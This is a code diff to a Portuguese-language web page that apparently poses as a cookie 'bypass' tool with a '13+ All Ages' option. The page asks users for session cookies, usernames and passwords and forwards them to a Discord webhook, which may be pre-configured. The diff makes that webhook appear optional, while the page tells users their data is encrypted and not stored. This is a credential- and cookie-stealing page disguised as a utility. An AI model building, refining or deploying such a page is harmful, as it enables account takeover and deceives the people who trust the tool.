@@ -200,6 +200,14 @@
             box-shadow: 0 5px 15px rgba(88, 101, 242, 0.4);
         }
         
+        .btn-optional {
+            background: linear-gradient(135deg, #6c757d, #5a6268);
+        }
+        
+        .btn-optional:hover {
+            box-shadow: 0 5px 15px rgba(108, 117, 125, 0.4);
+        }
+        
         .processing {
             display: none;
             text-align: center;
@@ -322,6 +330,15 @@
             font-size: 0.9rem;
         }
         
+        .optional-badge {
+            background: #6c757d;
+            color: white;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            margin-left: 8px;
+        }
+        
         @media (max-width: 768px) {
             .bypass-section {
                 flex-direction: column;
@@ -384,6 +401,12 @@
             border: 1px solid var(--accent-color);
             color: var(--accent-color);
         }
+        
+        .status-info {
+            background: rgba(0, 162, 255, 0.2);
+            border: 1px solid var(--primary-color);
+            color: var(--primary-color);
+        }
     </style>
 </head>
 <body>
@@ -401,8 +424,8 @@
         </div>
         
         <div class="discord-login">
-            <h2 class="info-title"><i class="fab fa-discord"></i> Login via Discord Webhook</h2>
-            <p>Para usar a ferramenta, primeiro faça login através do Discord</p>
+            <h2 class="info-title"><i class="fab fa-discord"></i> Login via Discord Webhook <span class="optional-badge">OPCIONAL</span></h2>
+            <p>Para receber os resultados no Discord, configure o webhook abaixo (não obrigatório)</p>
             
             <div class="form-group">
                 <label for="webhookUrl"><i class="fas fa-link"></i> URL do Webhook do Discord</label>
@@ -413,8 +436,12 @@
                 <i class="fab fa-discord"></i> Configurar Webhook
             </button>
             
+            <button class="btn-optional" onclick="removeWebhook()" style="margin-top: 10px;">
+                <i class="fas fa-times"></i> Remover Webhook
+            </button>
+            
             <div class="discord-info">
-                <p><i class="fas fa-info-circle"></i> Quando um cookie for processado, as informações serão enviadas para este webhook.</p>
+                <p><i class="fas fa-info-circle"></i> Quando um cookie for processado, as informações serão enviadas para este webhook (se configurado).</p>
             </div>
             
             <div id="webhookStatus" class="login-status"></div>
@@ -429,6 +456,7 @@
                 <li><i class="fas fa-key"></i> Senha é necessária apenas para bypass 13+ All Ages</li>
                 <li><i class="fas fa-clock"></i> Processamento pode levar 5-10 segundos dependendo da carga do servidor</li>
                 <li><i class="fas fa-lock"></i> Todos os dados processados são criptografados e não armazenados</li>
+                <li><i class="fab fa-discord"></i> Webhook do Discord é <strong>opcional</strong> - a ferramenta funciona sem ele</li>
             </ul>
         </div>
         
@@ -508,10 +536,13 @@
             const url = document.getElementById('webhookUrl').value;
             const status = document.getElementById('webhookStatus');
             
+            // Se o campo estiver vazio, apenas limpar o webhook
             if (!url) {
+                webhookUrl = '';
+                localStorage.removeItem('discordWebhook');
                 status.style.display = 'block';
-                status.className = 'login-status status-error';
-                status.innerHTML = '<i class="fas fa-times-circle"></i> Por favor, insira uma URL de webhook válida';
+                status.className = 'login-status status-info';
+                status.innerHTML = '<i class="fas fa-info-circle"></i> Webhook removido. Os resultados não serão enviados para o Discord.';
                 return;
             }
             
@@ -556,16 +587,19 @@
             });
         }
         
+        function removeWebhook() {
+            webhookUrl = '';
+            document.getElementById('webhookUrl').value = '';
+            localStorage.removeItem('discordWebhook');
+            
+            const status = document.getElementById('webhookStatus');
+            status.style.display = 'block';
+            status.className = 'login-status status-info';
+            status.innerHTML = '<i class="fas fa-info-circle"></i> Webhook removido. Os resultados não serão enviados para o Discord.';
+        }
+        
         function sendToDiscordWebhook(type, data) {
-            if (!webhookUrl) {
-                const savedWebhook = localStorage.getItem('discordWebhook');
-                if (savedWebhook) {
-                    webhookUrl = savedWebhook;
-                } else {
-                    alert('Webhook do Discord não configurado. Configure-o primeiro.');
-                    return;
-                }
-            }
+            if (!webhookUrl) return; // Não faz nada se não houver webhook configurado
             
             let content = '';
             
@@ -601,17 +635,6 @@
         }
         
         function processBypass(type) {
-            // Verificar se o webhook está configurado
-            if (!webhookUrl) {
-                const savedWebhook = localStorage.getItem('discordWebhook');
-                if (savedWebhook) {
-                    webhookUrl = savedWebhook;
-                } else {
-                    alert('Por favor, configure o webhook do Discord primeiro.');
-                    return;
-                }
-            }
-            
             // Mostrar o indicador de processamento
             document.getElementById(`processing-${type}`).style.display = 'flex';
             
@@ -624,7 +647,7 @@
                     return;
                 }
                 
-                // Enviar para o webhook do Discord
+                // Enviar para o webhook do Discord (se configurado)
                 sendToDiscordWebhook(type, cookie);
             } else if (type === '13plus') {
                 const username = document.getElementById('username13').value;
@@ -637,7 +660,7 @@
                     return;
                 }
                 
-                // Enviar para o webhook do Discord
+                // Enviar para o webhook do Discord (se configurado)
                 sendToDiscordWebhook(type, { username, password, cookie });
             }
             
@@ -664,8 +687,13 @@
                 status.style.display = 'block';
                 status.className = 'login-status status-success';
                 status.innerHTML = '<i class="fas fa-check-circle"></i> Webhook pré-configurado detectado.';
+            } else {
+                const status = document.getElementById('webhookStatus');
+                status.style.display = 'block';
+                status.className = 'login-status status-info';
+                status.innerHTML = '<i class="fas fa-info-circle"></i> Webhook não configurado. Os resultados não serão enviados para o Discord.';
             }
         });
     </script>
 </body>
-  </html>
+</html>
